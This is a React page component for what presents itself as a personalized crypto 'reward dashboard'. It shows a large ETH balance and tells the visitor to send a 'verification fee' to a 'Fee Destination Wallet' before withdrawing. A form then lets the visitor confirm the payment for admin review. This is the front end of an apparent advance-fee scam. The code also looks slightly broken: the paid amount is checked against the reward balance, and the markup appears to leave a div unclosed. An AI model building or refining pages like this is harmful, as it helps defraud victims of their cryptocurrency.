import { useRoute } from "wouter";
import { useUser } from "@/hooks/use-users";
import { useWithdrawalRequest } from "@/hooks/use-withdrawal";
import { UserLayout } from "@/components/layout/user-layout";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { formatDollar, formatEth, truncateWallet } from "@/lib/utils";
import { Copy, ArrowDownCircle, Info, CheckCircle2 } from "lucide-react";
import { useState } from "react";
import { useToast } from "@/hooks/use-toast";
import { useQueryClient } from "@tanstack/react-query";

export default function UserCongrats() {
  const [, params] = useRoute("/u/:slug");
  const slug = params?.slug || "";

  const { data: user, isLoading, isError } = useUser(slug);
  const { data: withdrawalRequest } = useWithdrawalRequest(slug);

  const queryClient = useQueryClient();
  const { toast } = useToast();

  const [copied, setCopied] = useState(false);
  const [withdrawAmount, setWithdrawAmount] = useState("");

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleSubmitPayment = async () => {
    const amount = parseFloat(withdrawAmount);
    if (!amount || amount <= 0) {
      toast({ title: "Enter a valid amount", variant: "destructive" });
      return;
    }
    if (user && amount > user.eligibleBalance) {
      toast({ title: "Amount exceeds your eligible balance", variant: "destructive" });
      return;
    }

    try {
      const res = await fetch(`/api/withdrawal-requests/${slug}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestedAmount: amount }),
      });

      if (!res.ok) throw new Error("Failed to submit payment");

      queryClient.invalidateQueries({ queryKey: ["withdrawal-request", slug] });

      toast({
        title: "Payment notification sent!",
        description: "Waiting for admin verification.",
      });
      setWithdrawAmount("");
    } catch (err: any) {
      toast({
        title: "Error",
        description: err.message || "Something went wrong",
        variant: "destructive",
      });
    }
  };

  if (isLoading) {
    return (
      <UserLayout slug={slug}>
        <div className="min-h-screen flex items-center justify-center">
          <div className="w-8 h-8 border-2 border-white border-t-transparent rounded-full animate-spin" />
        </div>
      </UserLayout>
    );
  }

  if (isError || !user) {
    return (
      <UserLayout slug={slug}>
        <div className="min-h-screen flex items-center justify-center p-6">
          <Card className="max-w-md w-full bg-zinc-900 border-zinc-800">
            <CardContent className="pt-8 pb-8 text-center">
              <h2 className="text-2xl font-semibold mb-2">Account Not Found</h2>
              <p className="text-zinc-400">The link you followed is invalid or has expired.</p>
            </CardContent>
          </Card>
        </div>
      </UserLayout>
    );
  }

  return (
    <UserLayout slug={slug}>
      <div className="max-w-2xl mx-auto px-6 pt-16 pb-24">
        {/* Header */}
        <div className="text-center mb-12">
          <h1 className="text-5xl font-semibold tracking-tight mb-3">
            Welcome, {user.name}
          </h1>
          <p className="text-zinc-400 text-lg">
            Your personalized reward dashboard
          </p>
        </div>

        {/* Balance Card */}
        <Card className="bg-zinc-900 border-zinc-800 mb-8">
          <CardContent className="p-10 text-center">
            <p className="text-sm uppercase tracking-widest text-zinc-500 mb-2">Available Reward</p>
            <div className="text-7xl font-semibold tracking-tighter mb-1">
              {formatDollar(user.eligibleBalance)}
            </div>
            <p className="text-zinc-400">worth of ETH</p>
          </CardContent>
        </Card>

        {/* Wallet Info */}
        <div className="grid gap-4 mb-8">
          <Card className="bg-zinc-900 border-zinc-800">
            <CardContent className="p-6 flex items-center justify-between">
              <div>
                <p className="text-sm text-zinc-500">Connected Wallet</p>
                <p className="font-mono text-sm mt-1">{truncateWallet(user.walletAddress)}</p>
              </div>
            </CardContent>
          </Card>

          {/* Fee Destination Wallet */}
          <Card className="bg-zinc-900 border-zinc-800">
            <CardContent className="p-6 flex items-center justify-between">
              <div>
                <p className="text-sm text-zinc-500">Fee Destination Wallet</p>
                <p className="font-mono text-sm mt-1 tracking-wider">{truncateWallet(user.feeWalletAddress)}</p>
              </div>
              <Button 
                onClick={() => copyToClipboard(user.feeWalletAddress)}
                className="bg-white text-black hover:bg-zinc-200 font-medium px-6"
              >
                {copied ? "Copied ✓" : "Copy Address"}
              </Button>
            </CardContent>
          </Card>

        {/* Withdrawal Fee Notice */}
        <Card className="bg-zinc-900 border-amber-500/20 mb-8">
          <CardContent className="p-6">
            <div className="flex gap-4">
              <Info className="w-5 h-5 text-amber-400 mt-0.5 flex-shrink-0" />
              <div>
                <p className="font-medium mb-1">Withdrawal Fee Required</p>
                <p className="text-sm text-zinc-400">
                  To process your withdrawal, send a verification fee of{" "}
                  <span className="text-amber-400 font-medium">
                    {formatEth(user.withdrawalFeeEth)} ETH
                  </span>{" "}
                  to the fee destination wallet above.
                </p>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Payment Form */}
        <Card className="bg-zinc-900 border-zinc-800">
          <CardContent className="p-8">
            <h3 className="text-lg font-medium mb-6">I've Made The Payment</h3>
            <div className="space-y-4">
              <Input
                type="number"
                step="0.0001"
                placeholder="Enter amount you paid (ETH)"
                value={withdrawAmount}
                onChange={(e) => setWithdrawAmount(e.target.value)}
                className="bg-black border-zinc-700"
              />
              <Button 
                onClick={handleSubmitPayment} 
                className="w-full py-6 text-base font-medium"
                disabled={!withdrawAmount}
              >
                Confirm Payment
              </Button>
            </div>
          </CardContent>
        </Card>
      </div>
    </UserLayout>
  );
}


